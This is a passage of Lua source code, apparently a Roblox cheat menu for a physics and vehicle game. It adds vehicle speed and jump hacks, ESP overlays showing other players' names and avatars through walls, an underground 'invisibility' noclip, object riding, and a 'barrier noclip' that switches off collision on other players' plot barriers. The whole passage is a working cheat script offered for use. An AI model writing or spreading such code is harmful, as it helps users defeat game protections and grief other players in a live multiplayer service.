                            gyro.MaxTorque = Vector3.new(1e6, 0, 1e6)
                            gyro.P = 5e4
                            gyro.D = 5e3
                            gyro.CFrame = root.CFrame
                            gyro.Parent = root
                            KozFlags._tractorGyro = gyro
                        end
                        local gyroObj = KozFlags._tractorGyro
                        gyroObj.CFrame = CFrame.new(root.Position, root.Position + Vector3.new(root.CFrame.LookVector.X, 0, root.CFrame.LookVector.Z).Unit)
                        root.AssemblyAngularVelocity = Vector3.new(0, root.AssemblyAngularVelocity.Y, 0)
                        local vel = root.AssemblyLinearVelocity
                        local flatVel = Vector3.new(vel.X, 0, vel.Z)
                        local throttle = seatPart.Throttle
                        local pressing = math.abs(throttle) > 0
                        local targetSpeed = pressing and (KozFlags.nitroActive and 300 or 100) or 0
                        KozFlags._tractorSpeed = KozFlags._tractorSpeed + (targetSpeed - KozFlags._tractorSpeed) * math.clamp(dt * 4, 0, 1)
                        if not pressing then
                            local friction = flatVel.Magnitude > 0.5 and flatVel.Unit * -1 * 80 * dt or Vector3.zero
                            root.AssemblyLinearVelocity = vel + friction
                        elseif KozFlags._tractorSpeed > 0.5 then
                            local seatLook = Vector3.new(seatPart.CFrame.LookVector.X, 0, seatPart.CFrame.LookVector.Z).Unit
                            local dir = throttle > 0 and seatLook or -seatLook
                            root.AssemblyLinearVelocity = dir * KozFlags._tractorSpeed + Vector3.new(0, vel.Y, 0)
                        end
                    end)
            else
                if KozFlags.speedTractorConn then
                    KozFlags.speedTractorConn:Disconnect()
                    KozFlags.speedTractorConn = nil
                end
                if KozFlags._tractorGyro then KozFlags._tractorGyro:Destroy() KozFlags._tractorGyro = nil end
                KozFlags._tractorSpeed = 0
            end
        end
    })
    TrainMiscGroup:AddLabel("Tractor Nitro"):AddKeyPicker("KozNitroKey", {
        Text = "Tractor Nitro",
        Default = "None",
        Mode = "Toggle",
        Callback = function(held)
            KozFlags.nitroActive = held
        end
    })
    TrainMiscGroup:AddLabel("Tractor Jump"):AddKeyPicker("KozTractorJumpKey", {
        Text = "Tractor Jump",
        Default = "None",
        Mode = "Toggle",
        Callback = function()
            local char = KozPLR.Character
            local hum = char and char:FindFirstChildOfClass("Humanoid")
            if not hum or not hum.SeatPart or not hum.SeatPart:IsA("VehicleSeat") then return end
            local seatPart = hum.SeatPart
            local model = seatPart.Parent
            if not model then return end
            local name = model.Name
            if name ~= "TractorGreen" and name ~= "TractorRed" and name ~= "TractorOrange" then return end
            local root = model.PrimaryPart or seatPart
            if not root then return end
            root.AssemblyLinearVelocity = Vector3.new(root.AssemblyLinearVelocity.X, 100, root.AssemblyLinearVelocity.Z)
        end
    })
    TrainMiscGroup:AddToggle("KozFPSBooster", {
        Text = "FPS Booster",
        Default = false,
        Callback = function(value)
            KozFlags.FPSBooster = value
            if value then KozMiscFeature.enableFPSBooster() else KozMiscFeature.disableFPSBooster() end
        end
    })
    TrainMiscGroup:AddToggle("KozMiniMap", {
        Text = "Mini Map",
        Default = false,
        Callback = function(value)
            KozFlags.miniMap = value
            if value then KozMiscFeature.startMiniMap() else KozMiscFeature.stopMiniMap() end
        end
    })
    TrainMiscGroup:AddToggle("KozPhantomPallets", {
        Text = "Phantom Pallets",
        Default = false,
        Callback = function(value)
            if value then KozMiscFeature.enablePhantomPallets() else KozMiscFeature.disablePhantomPallets() end
        end
    })
    TrainMiscGroup:AddToggle("KozGrabbedPalletExplore", {
        Text = "Grabbed Pallet Explore",
        Default = false,
        Callback = function(v)
            KozFlags.tk_palletExplore = v
            local KozTelekinesisFeature = KozFlags._feature
            if not KozTelekinesisFeature then return end
            if v then
                KozTelekinesisFeature.startPalletExplore()
            else
                KozTelekinesisFeature.stopPalletExplore()
            end
        end
    })
    TrainMiscGroup:AddLabel("Part Object Grab"):AddKeyPicker("KozPalletGodKey", {
        Text = "Part Object Grab",
        Default = "None",
        Mode = "Toggle",
        Callback = function()
            local char = KozPLR.Character
            if not char then return end
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if not hrp then return end
            if KozState.palletGodConn then
                KozState.palletGodConn:Disconnect()
                KozState.palletGodConn = nil
                local grabParts = KozWS:FindFirstChild("GrabParts")
                if grabParts then
                    local dragParts = {grabParts:FindFirstChild("DragPart"), grabParts:FindFirstChild("DragPart1")}
                    for _, dragPart in pairs(dragParts) do
                        if dragPart then
                            local ao = dragPart:FindFirstChildOfClass("AlignOrientation")
                            if ao then ao.MaxAngularVelocity = math.huge; ao.MaxTorque = 600000; ao.Responsiveness = 30 end
                            local ap = dragPart:FindFirstChildOfClass("AlignPosition")
                            if ap then ap.MaxAxesForce = Vector3.new(10000, 10000, 10000); ap.MaxForce = 60000; ap.MaxVelocity = math.huge; ap.Responsiveness = 40 end
                        end
                    end
                end
                local char = KozPLR.Character
                local hrp = char and char:FindFirstChild("HumanoidRootPart")
                if hrp and KozState.palletGodPart and KozState.palletGodPart.Parent then
                    if KozFlags.MasslessWgenPartObject then
                        hrp.AssemblyLinearVelocity = KozState.palletGodPart.AssemblyLinearVelocity / 1.4
                        hrp.AssemblyAngularVelocity = KozState.palletGodPart.AssemblyAngularVelocity / 1.4
                    end
                end
                KozState.palletGodPart = nil
                KozState.palletGodOffset = nil
                return
            end
            local grabParts = KozWS:FindFirstChild("GrabParts")
            if not grabParts then
                game.StarterGui:SetCore("SendNotification", {Title="Part Object", Text="First grab the object and stand on it", Duration=2})
                return
            end
            local bestPart = nil
            local bestDist = 15
            for _, gp in ipairs(grabParts:GetChildren()) do
                local weld = gp:FindFirstChildOfClass("WeldConstraint")
                if weld and weld.Part1 then
                    local d = (hrp.Position - weld.Part1.Position).Magnitude
                    if d < bestDist then
                        bestDist = d
                        bestPart = weld.Part1
                    end
                end
            end
            if not bestPart then
                game.StarterGui:SetCore("SendNotification", {Title="Part Object", Text="First grab the object and stand on it", Duration=2})
                return
            end
            local offset = hrp.CFrame:Inverse() * bestPart.CFrame
            KozState.palletGodPart = bestPart
            KozState.palletGodOffset = offset
            KozState.palletGodConn = KozRun.Heartbeat:Connect(function()
                    if not KozState.palletGodPart or not KozState.palletGodPart.Parent then
                        if KozState.palletGodConn then KozState.palletGodConn:Disconnect() end
                        KozState.palletGodConn = nil
                        KozState.palletGodPart = nil
                        return
                    end
                    if not KozWS:FindFirstChild("GrabParts") then
                        if KozState.palletGodConn then KozState.palletGodConn:Disconnect() end
                        KozState.palletGodConn = nil
                        KozState.palletGodPart = nil
                        return
                    end
                    local c = KozPLR.Character
                    local h = c and c:FindFirstChild("HumanoidRootPart")
                    if not h then return end
                    h.CFrame = KozState.palletGodPart.CFrame * KozState.palletGodOffset:Inverse()
                    h.AssemblyLinearVelocity = KozState.palletGodPart.AssemblyLinearVelocity
                    h.AssemblyAngularVelocity = KozState.palletGodPart.AssemblyAngularVelocity
                end)
        end
    })
    TrainMiscGroup:AddToggle("KozMasslessWgenPartObject", {
        Text = "Massless When On",
        Default = false,
        Callback = function(v)
            KozFlags.MasslessWgenPartObject = v
            if v then
                task.spawn(function()
                        while KozFlags.MasslessWgenPartObject do
                            if KozState.palletGodConn then
                                local grabParts = KozWS:FindFirstChild("GrabParts")
                                if grabParts then
                                    local dragParts = {grabParts:FindFirstChild("DragPart"), grabParts:FindFirstChild("DragPart1")}
                                    for _, dragPart in pairs(dragParts) do
                                        if dragPart then
                                            local alignOrientation = dragPart:FindFirstChildOfClass("AlignOrientation")
                                            if alignOrientation then
                                                alignOrientation.MaxAngularVelocity = math.huge
                                                alignOrientation.MaxTorque = math.huge
                                                alignOrientation.Responsiveness = 200
                                            end
                                            local alignPosition = dragPart:FindFirstChildOfClass("AlignPosition")
                                            if alignPosition then
                                                alignPosition.MaxAxesForce = Vector3.new(math.huge, math.huge, math.huge)
                                                alignPosition.MaxForce = math.huge
                                                alignPosition.MaxVelocity = math.huge
                                                alignPosition.Responsiveness = 200
                                            end
                                        end
                                    end
                                end
                            end
                            task.wait()
                        end
                        local grabParts = KozWS:FindFirstChild("GrabParts")
                        if grabParts then
                            local dragParts = {grabParts:FindFirstChild("DragPart"), grabParts:FindFirstChild("DragPart1")}
                            for _, dragPart in pairs(dragParts) do
                                if dragPart then
                                    local ao = dragPart:FindFirstChildOfClass("AlignOrientation")
                                    if ao then ao.MaxAngularVelocity = math.huge; ao.MaxTorque = 600000; ao.Responsiveness = 30 end
                                    local ap = dragPart:FindFirstChildOfClass("AlignPosition")
                                    if ap then ap.MaxAxesForce = Vector3.new(10000, 10000, 10000); ap.MaxForce = 60000; ap.MaxVelocity = math.huge; ap.Responsiveness = 40 end
                                end
                            end
                        end
                    end)
            end
        end
    })
    local thumbnailCache = {}
    local function loadThumb(plr)
        local thumb = thumbnailCache[plr.UserId]
        if thumb then return thumb end
        local ok, result = pcall(function()
            return KozPlayers:GetUserThumbnailAsync(
                plr.UserId,
                Enum.ThumbnailType.HeadShot,
                Enum.ThumbnailSize.Size100x100
            )
        end)
        if ok and result then
            thumbnailCache[plr.UserId] = result
            return result
        end
        return "rbxasset://textures/ui/GuiImagePlaceholder.png"
    end
    local function rebuildNameESP(plr)
        if plr == KozPLR then return end
        local char = plr.Character
        if not char then return end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        local oldBB = hrp:FindFirstChild("NameESP")
        if oldBB then oldBB:Destroy() end
        local oldHolder = hrp:FindFirstChild("NameESPHolder")
        if oldHolder then oldHolder:Destroy() end
        if not KozFlags.nameESP and not KozFlags.avatarESP then return end
        local showAvatar = KozFlags.avatarESP
        local showName = KozFlags.nameESP

        -- Fixed firmly onto HRP with StudsOffsetWorldSpace to prevent camera angle / distance drifting
        local bb = Instance.new("BillboardGui")
        bb.Name = "NameESP"
        bb.Adornee = hrp
        bb.Size = UDim2.new(0, 130, 0, 100)
        bb.AlwaysOnTop = true
        bb.LightInfluence = 0
        bb.StudsOffset = Vector3.zero
        bb.StudsOffsetWorldSpace = Vector3.new(0, 2.5, 0)
        bb.Parent = hrp

        local avatar = Instance.new("ImageLabel")
        avatar.Name = "AvatarCircle"
        avatar.AnchorPoint = Vector2.new(0.5, 0)
        avatar.Position = UDim2.new(0.5, 0, 0, 0)
        avatar.Size = UDim2.new(0, 50, 0, 50)
        avatar.BackgroundTransparency = 1
        avatar.Image = loadThumb(plr)
        avatar.ScaleType = Enum.ScaleType.Crop
        avatar.Visible = showAvatar
        avatar.Parent = bb

        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(1, 0)
        corner.Parent = avatar

        local stroke = Instance.new("UIStroke")
        stroke.Color = Color3.fromRGB(255, 255, 255)
        stroke.Thickness = 2
        stroke.Transparency = 0.3
        stroke.Parent = avatar

        -- Text 1.5x larger (from 13 to 20 for DisplayName, from 9 to 14 for Username)
        local nameYOffset = showAvatar and 54 or 8
        local tl = Instance.new("TextLabel")
        tl.Name = "NameLabel"
        tl.AnchorPoint = Vector2.new(0.5, 0)
        tl.Position = UDim2.new(0.5, 0, 0, nameYOffset)
        tl.Size = UDim2.new(1, 0, 0, 22)
        tl.BackgroundTransparency = 1
        tl.Text = plr.DisplayName
        tl.TextColor3 = Color3.fromRGB(255, 255, 255)
        tl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
        tl.TextStrokeTransparency = 0.2
        tl.TextScaled = false
        tl.Font = Enum.Font.GothamBold
        tl.TextSize = 20
        tl.Visible = showName
        tl.Parent = bb

        local tl2 = Instance.new("TextLabel")
        tl2.Name = "AccountLabel"
        tl2.AnchorPoint = Vector2.new(0.5, 0)
        tl2.Position = UDim2.new(0.5, 0, 0, nameYOffset + 22)
        tl2.Size = UDim2.new(1, 0, 0, 18)
        tl2.BackgroundTransparency = 1
        tl2.Text = plr.Name
        tl2.TextColor3 = Color3.fromRGB(190, 190, 190)
        tl2.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
        tl2.TextStrokeTransparency = 0.3
        tl2.TextScaled = false
        tl2.Font = Enum.Font.GothamBold
        tl2.TextSize = 14
        tl2.Visible = showName and plr.DisplayName ~= plr.Name
        tl2.Parent = bb
    end
    local nameESPConnections = {}
    local function hookNameESP(plr)
        if plr == KozPLR then return end
        if nameESPConnections[plr] then
            for _, c in ipairs(nameESPConnections[plr]) do pcall(function() c:Disconnect() end) end
        end
        nameESPConnections[plr] = {}
        table.insert(nameESPConnections[plr], plr.CharacterAdded:Connect(function(char)
            if not KozFlags.nameESP and not KozFlags.avatarESP then return end
            local hrp = char:WaitForChild("HumanoidRootPart", 3)
            if not hrp then return end
            rebuildNameESP(plr)
        end))
        if plr.Character then rebuildNameESP(plr) end
    end
    for _, plr in ipairs(KozPlayers:GetPlayers()) do hookNameESP(plr) end
    KozPlayers.PlayerAdded:Connect(function(plr) hookNameESP(plr) end)
    KozPlayers.PlayerRemoving:Connect(function(plr)
        if nameESPConnections[plr] then
            for _, c in ipairs(nameESPConnections[plr]) do pcall(function() c:Disconnect() end) end
            nameESPConnections[plr] = nil
        end
    end)
    task.spawn(function()
        while task.wait(0.5) do
            for _, plr in ipairs(KozPlayers:GetPlayers()) do
                if plr ~= KozPLR then
                    local char = plr.Character
                    local hrp = char and char:FindFirstChild("HumanoidRootPart")
                    if hrp and not hrp:FindFirstChild("NameESP") then
                        rebuildNameESP(plr)
                    end
                end
            end
        end
    end)
    TrainMiscGroup:AddToggle("KozNameESP", {
        Text = "Name ESP",
        Default = false,
        Callback = function(v)
            KozFlags.nameESP = v
            for _, plr in ipairs(KozPlayers:GetPlayers()) do rebuildNameESP(plr) end
        end
    })
    TrainMiscGroup:AddToggle("KozAvatarESP", {
        Text = "Avatar ESP",
        Default = false,
        Callback = function(v)
            KozFlags.avatarESP = v
            for _, plr in ipairs(KozPlayers:GetPlayers()) do rebuildNameESP(plr) end
        end
    })
    TrainMiscGroup:AddToggle("KozHighlightObjects", {
        Text = "Highlight Objects",
        Default = false,
        Callback = function(state)
            KozFlags.highlightObjects = state
            if not state then
                for _, obj in pairs(KozWS:GetDescendants()) do
                    local hl = obj:FindFirstChild("HighlightObj_HL")
                    if hl then hl:Destroy() end
                end
                return
            end
            local HighlightTargets = {
                {path = {"Workspace", "Map", "AlwaysHereTweenedObjects", "InnerUFO", "Object", "ObjectModel"}, color = Color3.fromRGB(255, 100, 100)},
                {path = {"Workspace", "Map", "AlwaysHereTweenedObjects", "OuterUFO", "Object", "ObjectModel"}, color = Color3.fromRGB(100, 255, 100)},
                {path = {"Workspace", "Map", "AlwaysHereTweenedObjects", "CaveCart", "Object", "ObjectModel"}, color = Color3.fromRGB(100, 100, 255)},
                {path = {"Workspace", "Map", "AlwaysHereTweenedObjects", "LrgDebris2", "Object", "ObjectModel"}, color = Color3.fromRGB(255, 255, 100)},
                {path = {"Workspace", "Map", "AlwaysHereTweenedObjects", "LrgDebris", "Object", "ObjectModel"}, color = Color3.fromRGB(255, 255, 255)},
                {path = {"Workspace", "Map", "AlwaysHereTweenedObjects", "Train", "Object", "ObjectModel"}, color = Color3.fromRGB(255, 150, 50)},
                {path = {"Workspace", "Map", "AlwaysHereTweenedObjects", "SmlDebris2", "Object", "ObjectModel"}, color = Color3.fromRGB(200, 100, 255)},
                {path = {"Workspace", "Map", "AlwaysHereTweenedObjects", "SmlDebris", "Object", "ObjectModel"}, color = Color3.fromRGB(50, 200, 200)},
            }
            local function highlightByPath(pathTable, fillColor)
                local current = game
                for _, folderName in ipairs(pathTable) do
                    if current == KozWS and folderName == "Workspace" then current = KozWS
                    else current = current:FindFirstChild(folderName) end
                    if not current then return end
                end
                for _, part in pairs(current:GetDescendants()) do
                    if part:IsA("BasePart") and not part:FindFirstChild("HighlightObj_HL") then
                        local hl = Instance.new("Highlight")
                        hl.Name = "HighlightObj_HL"
                        hl.FillColor = fillColor
                        hl.OutlineColor = fillColor:Lerp(Color3.new(0,0,0), 0.3)
                        hl.FillTransparency = 0.5
                        hl.OutlineTransparency = 0
                        hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                        hl.Parent = part
                    end
                end
            end
            local function highlightBodies()
                local slots1 = KozWS:FindFirstChild("Slots")
                if not slots1 then return end
                local slots2 = slots1:FindFirstChild("Slots")
                if not slots2 then return end
                for _, obj in pairs(slots2:GetDescendants()) do
                    if obj.Name == "Body" then
                        for _, part in pairs(obj:GetDescendants()) do
                            if part:IsA("BasePart") and not part:FindFirstChild("HighlightObj_HL") then
                                local hl = Instance.new("Highlight")
                                hl.Name = "HighlightObj_HL"
                                hl.FillColor = Color3.fromRGB(255, 200, 50)
                                hl.OutlineColor = Color3.fromRGB(200, 150, 30)
                                hl.FillTransparency = 0.5
                                hl.OutlineTransparency = 0
                                hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                                hl.Parent = part
                            end
                        end
                    end
                end
            end
            for _, target in ipairs(HighlightTargets) do highlightByPath(target.path, target.color) end
            highlightBodies()
            KozState.highlightObjectsConn = KozRun.Heartbeat:Connect(function()
                    if not KozFlags.highlightObjects then return end
                    highlightBodies()
                end)
        end
    })
    local pvpSafeEnabled = false
    local pvpSafePlatform = nil
    -- [KOZMOZ] "miscKeybindsSec" baska bolumun elemani, tasinmadi
    local legitPvpSafeActive = false
    local legitPvpSafeTask = nil
    -- [KOZMOZ] "miscKeybindsSec" baska bolumun elemani, tasinmadi
    do
    local palletPvpSafeActive = false
    local palletPvpSafeConn = nil
    local palletPvpSafePallet = nil
    local palletPvpSafeTarget = nil
    -- [KOZMOZ] "miscKeybindsSec" baska bolumun elemani, tasinmadi
    end
    _G.Invisibility = _G.Invisibility or {}
    _G.Invisibility.noclipEnabled = false
    _G.Invisibility.cameraOffset = 10
    _G.Invisibility.undergroundDepthOffset = 20
    _G.Invisibility.initialized = false
    _G.Invisibility.originalPosition = nil
    _G.Invisibility.originalCameraCFrame = nil
    _G.Invisibility.noclipConnection = nil
    _G.Invisibility.humanoidRootPartTransparency = nil
    _G.Invisibility.camera = KozWS.CurrentCamera
    local function updateInvisCharacter(char)
        if not char then return end
        _G.Invisibility.character = char
        task.spawn(function()
            _G.Invisibility.humanoidRootPart = char:FindFirstChild("HumanoidRootPart") or char:WaitForChild("HumanoidRootPart", 5)
            _G.Invisibility.head = char:FindFirstChild("Head") or char:WaitForChild("Head", 5)
        end)
    end
    if KozPLR.Character then
        updateInvisCharacter(KozPLR.Character)
    end
    _G.Invisibility.setNoclip = function(enabled)
        if enabled then
            _G.Invisibility.noclipConnection = KozRun.Stepped:Connect(function()
                for _, part in pairs(_G.Invisibility.character:GetChildren()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = false
                    end
                end
            end)
        elseif _G.Invisibility.noclipConnection then
            _G.Invisibility.noclipConnection:Disconnect()
            _G.Invisibility.noclipConnection = nil
        end
    end
    _G.Invisibility.setHumanoidRootPartTransparency = function(transparency)
        if _G.Invisibility.humanoidRootPart then
            _G.Invisibility.humanoidRootPart.Transparency = transparency
        end
    end
    _G.Invisibility.toggleNoclip = function(enabled)
        if _G.Invisibility.noclipEnabled ~= enabled then
            _G.Invisibility.noclipEnabled = enabled
            if _G.Invisibility.noclipEnabled then
                _G.Invisibility.originalPosition = _G.Invisibility.humanoidRootPart.Position
                _G.Invisibility.originalCameraCFrame = _G.Invisibility.camera.CFrame
                _G.Invisibility.humanoidRootPartTransparency = _G.Invisibility.humanoidRootPart.Transparency
                _G.Invisibility.setHumanoidRootPartTransparency(1)
                _G.Invisibility.setNoclip(true)
                local characterHeight = _G.Invisibility.originalPosition.Y
                local cameraTargetHeight = characterHeight + _G.Invisibility.cameraOffset
                local undergroundDepth = cameraTargetHeight - _G.Invisibility.undergroundDepthOffset
                local undergroundPos = Vector3.new(_G.Invisibility.originalPosition.X, undergroundDepth, _G.Invisibility.originalPosition.Z)
                _G.Invisibility.humanoidRootPart.CFrame = CFrame.new(undergroundPos)
                local currentCameraCF = _G.Invisibility.camera.CFrame
                local cameraPos = Vector3.new(undergroundPos.X, cameraTargetHeight, undergroundPos.Z)
                _G.Invisibility.camera.CFrame = applyScreenStretch(CFrame.new(cameraPos, cameraPos + currentCameraCF.LookVector))
            else
                _G.Invisibility.setNoclip(false)
                local surfacePos = Vector3.new(_G.Invisibility.humanoidRootPart.Position.X, _G.Invisibility.originalPosition.Y, _G.Invisibility.humanoidRootPart.Position.Z)
                _G.Invisibility.humanoidRootPart.CFrame = CFrame.new(surfacePos)
                _G.Invisibility.setHumanoidRootPartTransparency(_G.Invisibility.humanoidRootPartTransparency or 0)
            end
        end
    end
    KozRun.Heartbeat:Connect(function()
        if _G.Invisibility.noclipEnabled and _G.Invisibility.originalPosition then
            local characterHeight = _G.Invisibility.originalPosition.Y
            local cameraTargetHeight = characterHeight + _G.Invisibility.cameraOffset
            local targetUndergroundDepth = cameraTargetHeight - _G.Invisibility.undergroundDepthOffset
            local currentPos = _G.Invisibility.humanoidRootPart.Position
            if math.abs(currentPos.Y - targetUndergroundDepth) > 0.1 then
                _G.Invisibility.humanoidRootPart.CFrame = CFrame.new(currentPos.X, targetUndergroundDepth, currentPos.Z)
            end
        end
    end)
    KozRun.RenderStepped:Connect(function()
        if _G.Invisibility.noclipEnabled and _G.Invisibility.originalPosition then
            local characterPos = _G.Invisibility.humanoidRootPart.Position
            local characterHeight = _G.Invisibility.originalPosition.Y
            local cameraTargetHeight = characterHeight + _G.Invisibility.cameraOffset
            local currentCF = _G.Invisibility.camera.CFrame
            local lookVector = currentCF.LookVector
            local cameraPos = Vector3.new(characterPos.X, cameraTargetHeight, characterPos.Z)
            _G.Invisibility.camera.CFrame = applyScreenStretch(CFrame.new(cameraPos, cameraPos + lookVector))
        end
    end)
    KozPLR.CharacterAdded:Connect(function(newCharacter)
        task.wait(0.5)
        updateInvisCharacter(newCharacter)
        if _G.Invisibility.noclipEnabled then
            _G.Invisibility.originalPosition = _G.Invisibility.humanoidRootPart.Position
            _G.Invisibility.originalCameraCFrame = _G.Invisibility.camera.CFrame
            _G.Invisibility.humanoidRootPartTransparency = _G.Invisibility.humanoidRootPart.Transparency
            _G.Invisibility.setNoclip(true)
            _G.Invisibility.setHumanoidRootPartTransparency(1)
            local characterHeight = _G.Invisibility.originalPosition.Y
            local cameraTargetHeight = characterHeight + _G.Invisibility.cameraOffset
            local undergroundDepth = cameraTargetHeight - _G.Invisibility.undergroundDepthOffset
            local undergroundPos = Vector3.new(_G.Invisibility.humanoidRootPart.Position.X, undergroundDepth, _G.Invisibility.humanoidRootPart.Position.Z)
            _G.Invisibility.humanoidRootPart.CFrame = CFrame.new(undergroundPos)
        end
    end)
    KozPLR.CharacterRemoving:Connect(function()
        if _G.Invisibility.noclipEnabled then
            _G.Invisibility.setNoclip(false)
        end
    end)
    TrainMiscGroup:AddToggle("KozInvisibilityBeta", {
        Text = "Invisibility Beta",
        Default = false,
        Callback = function(v)
            if _G.Invisibility.initialized then
                _G.Invisibility.toggleNoclip(v)
            end
        end
    })
    _G.Invisibility.initialized = true
    local lockGrabCounter = 0
    -- [KOZMOZ] "miscKeybindsSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscKeybindsSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscKeybindsSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscKeybindsSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscKeybindsSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscKeybindsSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscKeybindsSec" baska bolumun elemani, tasinmadi
    local platformTPActive = false
    local platformTPOldPos = nil
    local platformTPPart = nil
    local function setupPlatformTP()
        if not platformTPPart or not platformTPPart.Parent then
            platformTPPart = Instance.new("Part")
            platformTPPart.Name = "SkyBase"
            platformTPPart.Anchored = true
            platformTPPart.Size = Vector3.new(1500, 2, 1500)
            platformTPPart.CFrame = CFrame.new(0, 1000000, 0)
            platformTPPart.Parent = KozWS
        end
    end
    setupPlatformTP()
    -- [KOZMOZ] "miscKeybindsSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscUtilSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscUtilSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscUtilSec" baska bolumun elemani, tasinmadi
    local miscBringTarget = nil
    local miscBringCombo
    -- [KOZMOZ] "miscBringSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscBringSec" baska bolumun elemani, tasinmadi
    local miscBringCombo = setmetatable({}, {__index = function() return function() end end}) -- bos eleman (kaynak bolumu tasindi)
    -- [KOZMOZ] "miscBringSec" baska bolumun elemani, tasinmadi
    do
    local viewTarget = nil
    local viewEnabled = false
    local viewConn = nil
    local miscViewCombo
    local viewYaw = 0
    local viewPitch = 0
    local viewMouseConn = nil
    local viewSavedData = {}
    local function viewHideAccessories(character)
        local head = character:FindFirstChild("Head")
        if head then
            if not viewSavedData._saved then
                viewSavedData.headTransparency = head.Transparency
                for _, obj in ipairs(head:GetChildren()) do
                    pcall(function()
                        if obj:IsA("Decal") then
                            viewSavedData[obj] = obj.Transparency
                        elseif obj:IsA("SpecialMesh") then
                            viewSavedData[obj] = {MeshId = obj.MeshId, TextureId = obj.TextureId}
                        elseif obj:IsA("SurfaceGui") or obj:IsA("BillboardGui") then
                            viewSavedData[obj] = obj.Enabled
                        end
                    end)
                end
                for _, acc in ipairs(character:GetDescendants()) do
                    if acc:IsA("Accessory") then
                        local handle = acc:FindFirstChild("Handle")
                        if handle then
                            viewSavedData[handle] = handle.Transparency
                        end
                    end
                end
                viewSavedData._saved = true
            end
            head.Transparency = 1
            for _, obj in ipairs(head:GetChildren()) do
                pcall(function()
                    if obj:IsA("Decal") then
                        obj.Transparency = 1
                    elseif obj:IsA("SpecialMesh") then
                        obj.MeshId = ""
                        obj.TextureId = ""
                    elseif obj:IsA("SurfaceGui") or obj:IsA("BillboardGui") then
                        obj.Enabled = false
                    end
                end)
            end
        end
        for _, acc in ipairs(character:GetDescendants()) do
            if acc:IsA("Accessory") then
                local handle = acc:FindFirstChild("Handle")
                if handle then handle.Transparency = 1 end
            end
        end
    end
    local function viewRestorePlayer(playerName)
        local target = playerName and KozPlayers:FindFirstChild(playerName)
        if not target or not target.Character then return end
        local head = target.Character:FindFirstChild("Head")
        if head then
            head.Transparency = viewSavedData.headTransparency or 0
            for _, obj in ipairs(head:GetChildren()) do
                pcall(function()
                    if obj:IsA("Decal") then
                        obj.Transparency = viewSavedData[obj] or 0
                    elseif obj:IsA("SpecialMesh") then
                        local saved = viewSavedData[obj]
                        if saved then
                            obj.MeshId = saved.MeshId
                            obj.TextureId = saved.TextureId
                        end
                    elseif obj:IsA("SurfaceGui") or obj:IsA("BillboardGui") then
                        if viewSavedData[obj] ~= nil then
                            obj.Enabled = viewSavedData[obj]
                        end
                    end
                end)
            end
        end
        for _, acc in ipairs(target.Character:GetDescendants()) do
            if acc:IsA("Accessory") then
                local handle = acc:FindFirstChild("Handle")
                if handle then
                    handle.Transparency = viewSavedData[handle] or 0
                end
            end
        end
        viewSavedData = {}
    end
    -- [KOZMOZ] "miscViewSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscViewSec" baska bolumun elemani, tasinmadi
    local miscViewCombo = setmetatable({}, {__index = function() return function() end end}) -- bos eleman (kaynak bolumu tasindi)
    -- [KOZMOZ] "miscViewSec" baska bolumun elemani, tasinmadi
    local camViewEnabled = false
    local camViewConn = nil
    local camViewOriginalCF = nil
    local camViewPart = nil
    local camViewOriginalSubject = nil
    -- [KOZMOZ] "miscViewSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscViewSec" baska bolumun elemani, tasinmadi
    local viewForceTP = false
    local viewForceSide = "Backward"
    local viewForceDist = 5
    local viewForceConn = nil
    -- [KOZMOZ] "miscViewSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscViewSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscViewSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscViewSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscViewSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscViewSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscUtilSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscUtilSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscUtilSec" baska bolumun elemani, tasinmadi
    local barrierNoclipConn = nil
    local barrierNoclipLoop = nil
    KozState.barrierNoclipSaved = nil
    local function barrierNoclipApply(part)
        if not part:IsA("BasePart") then return end
        if not KozState.barrierNoclipSaved then KozState.barrierNoclipSaved = {} end
        if not KozState.barrierNoclipSaved[part] then
            KozState.barrierNoclipSaved[part] = {
                CanCollide = part.CanCollide,
                CanQuery = part.CanQuery,
                CanTouch = part.CanTouch,
            }
        end
        part.CanCollide = false
        part.CanQuery = false
        part.CanTouch = false
    end
    local function barrierNoclipApplyRecursive(obj)
        barrierNoclipApply(obj)
        for _, child in ipairs(obj:GetChildren()) do
            barrierNoclipApplyRecursive(child)
        end
    end
    local function setBarrierNoclip()
        if not KozState.barrierNoclip then return end
        local Plots = KozWS:FindFirstChild("Plots")
        local root = Plots or KozWS
        for _, obj in ipairs(root:GetDescendants()) do
            if obj.Name == "PlotBarrier" or obj.Name == "PlotArea" then
                barrierNoclipApplyRecursive(obj)
            end
        end
    end
    local function restoreBarrierNoclip()
        if KozState.barrierNoclipSaved then
            for part, props in pairs(KozState.barrierNoclipSaved) do
                if part and part.Parent then
                    part.CanCollide = props.CanCollide
                    part.CanQuery = props.CanQuery
                    part.CanTouch = props.CanTouch
                end
            end
            KozState.barrierNoclipSaved = nil
        end
    end
    -- [KOZMOZ] "miscUtilSec" baska bolumun elemani, tasinmadi
    TrainMiscGroup:AddToggle("KozGamepassToggle", {
